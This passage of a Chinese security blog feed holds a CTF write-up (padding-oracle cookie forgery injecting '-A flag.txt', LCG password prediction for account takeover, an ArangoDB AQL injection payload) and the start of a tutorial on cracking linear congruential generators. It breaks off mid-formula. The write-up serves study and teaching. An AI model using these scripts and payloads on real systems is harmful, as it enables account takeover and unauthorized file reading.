class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> padding_oracle <span class="keyword">import</span> PaddingOracle</span><br><span class="line"><span class="keyword">from</span> optimized_alphabets <span class="keyword">import</span> json_alphabet</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(cipher_hex)</span>:</span></span><br><span class="line">    headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'vals=&#123;&#125;'</span>.format(cipher_hex)&#125;</span><br><span class="line">    r = requests.get(<span class="string">'http://converter.uni.hctf.fun/convert'</span>, headers=headers)</span><br><span class="line">    response = r.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'Invalid padding bytes.'</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">o = PaddingOracle(oracle, max_retries=<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763'</span></span><br><span class="line">plain     = <span class="string">b'&#123;"f": "markdown", "c": "AAAABBBBCCCCDDDD", "t": "html4"&#125;'</span></span><br><span class="line">plain_new = <span class="string">b'&#123;"f": "markdown -A flag.txt", "c": "D", "t": "html4"&#125;'</span></span><br><span class="line"></span><br><span class="line">cipher_new = o.craft(cipher, plain, plain_new)</span><br><span class="line">print(<span class="string">'Modified: &#123;&#125;'</span>.format(cipher_new))</span><br></pre></td></tr></table></figure><p>最终得到flag<br><a href="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png" alt="屏幕快照 2018-11-01 下午6.03.36.png"></a></p><h1 id="LCG-and-the-X"><a href="#LCG-and-the-X" class="headerlink" title="LCG and the X"></a>LCG and the X</h1><p>打开主页看到如下描述，最后一句<code>Save secret messages prefixed with &quot;flag{&quot; (which is always handy...)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hello!</span><br><span class="line">This is the website for our on-campus fanclub of the band LCG and the X!</span><br><span class="line">Everyone can signup for the club to:</span><br><span class="line"></span><br><span class="line">   Get the latest LCG news</span><br><span class="line">   Communicate with other fans</span><br><span class="line">   Save secret messages prefixed with &quot;flag&#123;&quot; (which is always handy...)</span><br></pre></td></tr></table></figure><p>接下我们进行注册登录，注册后可以看到如下信息：</p><p><a href="https://i.loli.net/2018/11/02/5bdc0a1864318.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/02/5bdc0a1864318.png" alt="屏幕快照 2018-11-02 下午4.25.25.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User Number: 34 </span><br><span class="line">Password: 4391179335210642486020975422279755323</span><br></pre></td></tr></table></figure><p>bitmap图片的地址为<code>http://lcgandthex.uni.hctf.fun/static/pics/34.bmp</code>，bitmap图片名称前面的序号和我们用户名的相同，所以如果我们更改图片前面的序号还可以下载其他的bitmap图片。而这个bitmap图片还是作为password recovery token来使用的，所以我们就可以利用它来重置别的账户的密码。</p><p>接下来我们进行登录，登陆后可以看到这样的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">News</span><br><span class="line">Website Launch</span><br><span class="line">I just took the website online. I wrote it myself! </span><br><span class="line">I also just signed up to make sure the signup process works.</span><br><span class="line">Then I created a secret flag, which worked as well!</span><br><span class="line">Flag Storage Maintenance</span><br><span class="line">Because of the new data protection laws in europe I decided to temporarily disable the secret flag storage... I hope i can bring it back up soon...</span><br></pre></td></tr></table></figure><p>可以看到对于我们这个账户而言，密码是被隐藏的，因此可能我们需要登录管理员的账户进行查看？那么管理员有可能是序号为1的那一个？那么我们就要考虑怎么去获取1号的密码了。因为这里的password recovery token没有地方去让我们使用，比赛结束后也有看别的战队是使用如下脚本分析了bitmap图片然后得到一些信息之后进行LCG破解的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> imageio</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"Usage: %s file.bmp"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">filename = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">image = imageio.imread(filename)</span><br><span class="line">out = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> image:</span><br><span class="line">    tmp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(line)):</span><br><span class="line">        tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">        tmp |= <span class="number">1</span> <span class="keyword">if</span> line[x] == <span class="number">255</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    print(<span class="string">"% 40d"</span> % tmp)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">对比两个用户bitmap图片中的信息可以发下现两者相差 313373133731337313373133731337</span><br><span class="line"></span><br><span class="line">这里只截取前五行</span><br><span class="line"></span><br><span class="line">34.bmp</span><br><span class="line">        10778143335877814333587781433348</span><br><span class="line">   8024293302815125776712035454147967229</span><br><span class="line">   8424888415969153255243735974754402615</span><br><span class="line">   3343897317520929957383430099400071436</span><br><span class="line">  12356584033995394658660863293223597252</span><br><span class="line">  </span><br><span class="line">35.bmp</span><br><span class="line">        11091516469609151646960915164685</span><br><span class="line">   9972138259316515878515303887207190382</span><br><span class="line">   7570417892854896822411051461517328212</span><br><span class="line">  16016475982551891670926030402121628733</span><br><span class="line">   9296242651229076123142121777120916609</span><br></pre></td></tr></table></figure><p>之后再推算出一下值之后进行的攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m = 16285270385112413720426683811263350667</span><br><span class="line">a = 313373133731337313373133731337</span><br><span class="line">c = 123456789012345678901234567890</span><br></pre></td></tr></table></figure><p>但是我们这里不这么干，密码是LCG生成的(因为题目本身就提示了LCG这个算法)，那么我们这里就属于不清楚a\c\m的值对LCG生成器进行攻击，那么连续注册几个账号，采集一下密码输入一下脚本就好了。着这里使用burp多重放几次数据包就可以了，不用次都去输信息注册。</p><p><a href="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png" alt="屏幕快照 2018-11-02 下午5.24.28.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">User Number: 34 </span><br><span class="line">Password: 4391179335210642486020975422279755323 </span><br><span class="line"></span><br><span class="line">User Number: 35 </span><br><span class="line">Password: 10752978387235368639990800431243402580 </span><br><span class="line"></span><br><span class="line">User Number: 36 </span><br><span class="line">Password: 829507054147681073533941628943699170 </span><br><span class="line"></span><br><span class="line">User Number: 37 </span><br><span class="line">Password: 7191306106172407227503766637907346427 </span><br><span class="line"></span><br><span class="line">User Number: 38 </span><br><span class="line">Password: 13553105158197133381473591646870993684</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line">reduce = functools.reduce</span><br><span class="line">gcd = math.gcd</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, y - (b // a) * x, x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(b, n)</span>:</span></span><br><span class="line">    g, x, _ = egcd(b, n)</span><br><span class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> x % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span><span class="params">(states, modulus, multiplier)</span>:</span></span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span><span class="params">(states, modulus)</span>:</span></span><br><span class="line">    print(<span class="string">'states'</span>, states)</span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_modulus</span><span class="params">(states)</span>:</span></span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> zip(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> zip(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line">print(crack_unknown_modulus([<span class="number">4391179335210642486020975422279755323</span>, </span><br><span class="line">    <span class="number">10752978387235368639990800431243402580</span>, <span class="number">829507054147681073533941628943699170</span>, <span class="number">7191306106172407227503766637907346427</span>, <span class="number">13553105158197133381473591646870993684</span>]))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># m = 1  # the "multiplier"</span></span><br><span class="line"><span class="comment"># c = 6361799052024726153969825008963647257  # the "increment"</span></span><br><span class="line"><span class="comment"># n = 16285270385112413720426683811263350667  # the "modulus"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prng_lcg</span>:</span></span><br><span class="line">    m = <span class="number">1</span>  <span class="comment"># the "multiplier"</span></span><br><span class="line">    c = <span class="number">6361799052024726153969825008963647257</span>  <span class="comment"># the "increment"</span></span><br><span class="line">    n = <span class="number">16285270385112413720426683811263350667</span>  <span class="comment"># the "modulus"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, seed)</span>:</span></span><br><span class="line">        self.state = seed  <span class="comment"># the "seed"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.state = (self.state * self.m + self.c) % self.n</span><br><span class="line">        <span class="keyword">return</span> self.state</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prev</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.state = (self.state - self.c) % self.n</span><br><span class="line">        <span class="keyword">return</span> int(self.state)</span><br><span class="line"></span><br><span class="line"><span class="comment">#User Number: 46 </span></span><br><span class="line"><span class="comment">#Password: 15591686419057701451952140284790119739 </span></span><br><span class="line"></span><br><span class="line">gen = prng_lcg(<span class="number">15591686419057701451952140284790119739</span>) </span><br><span class="line"></span><br><span class="line">num = <span class="number">45</span></span><br><span class="line"><span class="keyword">while</span> num &gt; <span class="number">0</span>:</span><br><span class="line">    p = gen.prev()</span><br><span class="line">    print(num, p)</span><br><span class="line">    <span class="keyword">if</span> p == <span class="number">4391179335210642486020975422279755323</span>:</span><br><span class="line">        print(<span class="string">'sanity check: working'</span>)</span><br><span class="line">    num -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1 =&gt; 6160325624856057770563639672902954513</span></span><br></pre></td></tr></table></figure><p>最后登录得到flag<br><a href="https://i.loli.net/2018/11/02/5bdc17d94dd01.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/02/5bdc17d94dd01.png" alt="屏幕快照 2018-11-02 下午5.23.43.png"></a></p><p>PS:关于此处LCG攻击，你可以查看<a href="http://zeroyu.xyz/2018/11/02/Cracking-LCG/" target="_blank" rel="noopener">《攻击线性同余生成器(LCG)》</a></p><h1 id="H-pster-Startup"><a href="#H-pster-Startup" class="headerlink" title="H!pster Startup"></a>H!pster Startup</h1><p>主页代码里可以找到后台，所以就不用扫描了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--  Main navigation  --&gt;</span><br><span class="line">&lt;ul class=&quot;main-nav nav navbar-nav navbar-right&quot;&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;#home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;#service&quot;&gt;Services&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;!-- &lt;li&gt;&lt;a href=&quot;/admin&quot;&gt;Admin-Panel&lt;/a&gt;&lt;/li&gt; --&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;!-- /Main navigation --&gt;</span><br></pre></td></tr></table></figure><p>后台测试发现是ArangoDB并且使用pyArango进行驱动程序。源码中存在如下内容，所以需要<code>_id</code>参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try :</span><br><span class="line">    collection = self.database[docJson[&quot;_id&quot;].split(&quot;/&quot;)[0]]</span><br><span class="line">except KeyError :</span><br><span class="line">    raise CreationError(&quot;result %d is not a valid Document. Try setting rawResults to True&quot; % i)</span><br></pre></td></tr></table></figure><p>最终的payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user: &apos; || 1 RETURN &#123;_id: u._id, role:&apos;admin&apos;&#125; //</span><br></pre></td></tr></table></figure></p><p>flag为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1_l0v3_a_g00d_1nj3ct10n&#125;</span><br></pre></td></tr></table></figure><p>此处我在写note的时候，官方的题目已经关闭了，所以列出一些参考:</p><p><a href="https://www.pwndiary.com/write-ups/p-w-n-ctf-2018-hpster-startup-write-up-web216/" target="_blank" rel="noopener">[P.W.N. CTF 2018] H!pster Startup Write-up (Web216)</a></p><p><a href="https://0day.work/p-w-n-university-web-200-h-pster-startup-writeup/" target="_blank" rel="noopener">P.W.N University: web 200 - H!pster Startup writeup</a></p><p><a href="https://xz.aliyun.com/t/3096#toc-5" target="_blank" rel="noopener">《P.W.N. CTF web题解》</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Login-Sec&quot;&gt;&lt;a href=&quot;#Login-Sec&quot; class=&quot;headerlink&quot; title=&quot;Login Sec&quot;&gt;&lt;/a&gt;Login Sec&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Login 1&lt;/strong&gt;的代码如下:&lt;/p&gt;
&lt;figure
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>攻击线性同余生成器(LCG)</title>
    <link href="http://zer0yu.github.io/2018/11/02/Cracking-LCG/"/>
    <id>http://zer0yu.github.io/2018/11/02/Cracking-LCG/</id>
    <published>2018-11-01T16:19:50.000Z</published>
    <updated>2018-11-02T10:11:11.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>目前我们在编程中经常会使用随机数，但是其中会不会存在什么问题呢？要知道CPU计算中的各种状态都是确定的，在其中的随机数不是凭空产生的，所以这种随机数真的随机吗？目前生成随机数的方式主要分为以下几种:</p><ul><li>硬件随机数生成器</li><li>利用现有硬件，从非预期方式产生随机数(比如利用音频的产生、硬盘寻址时间等)</li><li>伪随机数</li><li>量子技术</li></ul><p>PS: RDRAND指令产生的随机数目前存在争议，在此不做详细讨论。有兴趣可以参考 <a href="https://zh.wikipedia.org/wiki/RdRand" target="_blank" rel="noopener">RdRand</a></p><p>虽然选择很多，但是目前还是主要采用伪随机数的方式来应对实际开发中需要的场景。用于产生这些看起来随机但实际是由确定性算法生成数字的机制被称为”伪随机数发生器”，简称为PRNG。</p><p>PRNG的中心是确定的，如果攻击者知道其内部的完整状态，则可以对未来的值和过去的值进行预测。如果PRNG被用于加密密钥、生成证书等场景，就会出现安全问题。</p><p>接下来我将详细讲解对线性同余发生器的攻击。</p><h2 id="0x01-线性同余生成器-LCG"><a href="#0x01-线性同余生成器-LCG" class="headerlink" title="0x01 线性同余生成器(LCG)"></a>0x01 线性同余生成器(LCG)</h2><h3 id="1-线性同余方法"><a href="#1-线性同余方法" class="headerlink" title="1.线性同余方法"></a>1.线性同余方法</h3><p>线性同余方法（LCG）是个产生伪随机数的方法。</p><p>它是根据递归公式：</p><p><html><br><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/0977413db70881e55ed0f0dd154d7314f0f4499a" class="mwe-math-fallback-image-inline" aria-hidden="true" style="vertical-align: -1.005ex; width:33.874ex; height:3.009ex;" alt="N_NaN\equiv (A\times N_{j}+B){\pmod  {M}}"><br></html><br>其中A,B,M是产生器设定的常数。</p><p>LCG的周期最大为 M，但大部分情况都会少于M。要令LCG达到最大周期，应符合以下条件：</p><ol><li>B,M互质；</li><li>M的所有质因数都能整除A-1；</li><li>若M是4的倍数，A-1也是；</li><li>A,B,N[0]都比M小；</li><li>A,B是正整数。</li></ol><h3 id="2-Python代码实现"><a href="#2-Python代码实现" class="headerlink" title="2.Python代码实现"></a>2.Python代码实现</h3><p>由上面的原理我们可以看到，其中最重要的是定义了三个整数，乘数A、增量B和模数M，因此我们在此用简单的几行Python代码实现一下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class prng_lcg:</span><br><span class="line">    m = 672257317069504227  # &quot;乘数&quot;</span><br><span class="line">    c = 7382843889490547368  # &quot;增量&quot;</span><br><span class="line">    n = 9223372036854775783  # &quot;模数&quot;</span><br><span class="line"></span><br><span class="line">    def __init__(self, seed):</span><br><span class="line">        self.state = seed  # the &quot;seed&quot;</span><br><span class="line"></span><br><span class="line">    def next(self):</span><br><span class="line">        self.state = (self.state * self.m + self.c) % self.n</span><br><span class="line">        return self.state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    gen = prng_lcg(123)  # seed = 123</span><br><span class="line">    print gen.next()  # 第一个生成值</span><br><span class="line">    print gen.next()  # 第二个生成值</span><br><span class="line">    print gen.next()  # 第三个生成值</span><br></pre></td></tr></table></figure><h3 id="3-LCG的优缺点"><a href="#3-LCG的优缺点" class="headerlink" title="3.LCG的优缺点"></a>3.LCG的优缺点</h3><p>LCG目前是分流行，得益于其在数学表达实现上十分优雅、非常容易理解并且容易设计实现、计算速度可以非常快。但是它也存在一些缺点，比如它在加密安全性方面十分弱。接下来将从以下几种情况对其进行攻击。</p><h2 id="0x02-攻击LCG"><a href="#0x02-攻击LCG" class="headerlink" title="0x02 攻击LCG"></a>0x02 攻击LCG</h2><h3 id="1-对于A、B、M以及N0已知的情况"><a href="#1-对于A、B、M以及N0已知的情况" class="headerlink" title="1. 对于A、B、M以及N0已知的情况"></a>1. 对于A、B、M以及N0已知的情况</h3><p>假设我们观察到有一个LCG系统产生了以下三组连续的值，并且我们知道内部的参数如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 三组连续的值</span><br><span class="line">s0 = 2300417199649672133</span><br><span class="line">s1 = 2071270403368304644</span><br><span class="line">s2 = 5907618127072939765</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 内部的参数</span><br><span class="line">m = 672257317069504227   # the &quot;multiplier&quot;</span><br><span class="line">c = 7382843889490547368  # the &quot;increment&quot;</span><br><span class="line">n = 9223372036854775783  # the &quot;modulus&quot;</span><br></pre></td></tr></table></figure><p>在已知了这些参数之后我们可以很快的推算出未来的数值或者之前的某个数值，所以还是存在安全问题的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In [1]: m = 672257317069504227</span><br><span class="line"></span><br><span class="line">In [2]: c = 7382843889490547368</span><br><span class="line"></span><br><span class="line">In [3]: n = 9223372036854775783</span><br><span class="line"></span><br><span class="line">In [4]: s0 = 2300417199649672133</span><br><span class="line"></span><br><span class="line">In [5]: s1 = (s0*m + c) % n</span><br><span class="line"></span><br><span class="line">In [6]: s2 = (s1*m + c) % n</span><br><span class="line"></span><br><span class="line">In [7]: s3 = (s2*m + c) % n</span><br><span class="line"></span><br><span class="line">In [8]: s4 = (s3*m + c) % n</span><br><span class="line"></span><br><span class="line">In [9]: s1</span><br><span class="line">Out[9]: 2071270403368304644L</span><br><span class="line"></span><br><span class="line">In [10]: s2</span><br><span class="line">Out[10]: 5907618127072939765L</span><br><span class="line"></span><br><span class="line">In [11]: s3</span><br><span class="line">Out[11]: 5457707446309988294L</span><br></pre></td></tr></table></figure><h3 id="2-增量未知"><a href="#2-增量未知" class="headerlink" title="2.增量未知"></a>2.增量未知</h3><p>我们不清楚增量，但是我们知道以下信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m = 81853448938945944</span><br><span class="line">c = # unknown</span><br><span class="line">n = 9223372036854775783</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 初值和第一个计算值</span><br><span class="line">s0 = 4501678582054734753</span><br><span class="line">s1 = 4371244338968431602</span><br></pre></td></tr></table></figure><p>我们稍稍改写下公式就可以将目标c计算出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s1 = s0*m + c   (mod n)</span><br><span class="line"></span><br><span class="line">c  = s1 - s0*m  (mod n)</span><br></pre></td></tr></table></figure><p>此种类型Python攻击代码如下所示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def crack_unknown_increment(states, modulus, multiplier):</span><br><span class="line">    increment = (states[1] - states[0]*multiplier) % modulus</span><br><span class="line">    return modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line">print crack_unknown_increment([4501678582054734753, 4371244338968431602], 9223372036854775783, 81853448938945944)</span><br></pre></td></tr></table></figure><h3 id="3-增量和乘数都未知"><a href="#3-增量和乘数都未知" class="headerlink" title="3.增量和乘数都未知"></a>3.增量和乘数都未知</h3><p>我们虽然不知道增量和乘数但是我们知道以下数值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m = # unknown</span><br><span class="line">c = # unknown</span><br><span class="line">n = 9223372036854775783</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># LCG生成的初值和后面生成的两个值</span><br><span class="line">s0 = 6473702802409947663</span><br><span class="line">s1 = 6562621845583276653</span><br><span class="line">s2 = 4483807506768649573</span><br></pre></td></tr></table></figure><p>解决办法很简单，想想怎么解线性方程组就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s_1 = s0*m + c  (mod n)</span><br><span class="line">s_2 = s1*m + c  (mod n)</span><br><span class="line"></span><br><span class="line">s_2 - s_1 = s1*m - s0*m  (mod 